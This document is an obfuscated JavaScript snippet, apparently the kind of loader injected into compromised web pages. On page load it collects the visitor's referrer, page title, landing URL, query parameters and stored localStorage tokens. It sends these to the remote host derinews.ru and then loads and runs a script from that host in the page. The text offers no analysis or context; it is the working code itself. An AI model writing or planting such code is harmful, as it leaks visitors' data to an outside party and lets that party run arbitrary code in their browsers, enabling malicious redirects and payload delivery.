(function() {
    var name = '_ygfwc27LN3Tcgdzr';
    if (!window._ygfwc27LN3Tcgdzr) {
        window._ygfwc27LN3Tcgdzr = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://derinews.ru/rKx1rgnB',
        };
    }
    const _BmH2KZWV7545phHk = localStorage.getItem('config');
    if (typeof _BmH2KZWV7545phHk !== 'undefined' && _BmH2KZWV7545phHk !== null) {
        var _G5c4jmpP5KH4nM2n = JSON.parse(_BmH2KZWV7545phHk);
        var _Z94GmxRsyBS5WnrD = Math.round(+new Date()/1000);
        if (_G5c4jmpP5KH4nM2n.created_at + window._ygfwc27LN3Tcgdzr.ttl < _Z94GmxRsyBS5WnrD) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _TnvCG6pWS3FXbXFH = localStorage.getItem('subId');
    var _8D6SzRdBS4jnGfP2 = localStorage.getItem('token');
    var _cRGvr6bfzfQ8JnVh = '?return=js.client';
        _cRGvr6bfzfQ8JnVh += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _cRGvr6bfzfQ8JnVh += '&se_referrer=' + encodeURIComponent(document.referrer);
        _cRGvr6bfzfQ8JnVh += '&default_keyword=' + encodeURIComponent(document.title);
        _cRGvr6bfzfQ8JnVh += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _cRGvr6bfzfQ8JnVh += '&name=' + encodeURIComponent(name);
        _cRGvr6bfzfQ8JnVh += '&host=' + encodeURIComponent(window._ygfwc27LN3Tcgdzr.R_PATH);
    if (typeof _TnvCG6pWS3FXbXFH !== 'undefined' && _TnvCG6pWS3FXbXFH && window._ygfwc27LN3Tcgdzr.unique) {
        _cRGvr6bfzfQ8JnVh += '&sub_id=' + encodeURIComponent(_TnvCG6pWS3FXbXFH);
    }
    if (typeof _8D6SzRdBS4jnGfP2 !== 'undefined' && _8D6SzRdBS4jnGfP2 && window._ygfwc27LN3Tcgdzr.unique) {
        _cRGvr6bfzfQ8JnVh += '&token=' + encodeURIComponent(_8D6SzRdBS4jnGfP2);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._ygfwc27LN3Tcgdzr.R_PATH + _cRGvr6bfzfQ8JnVh;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
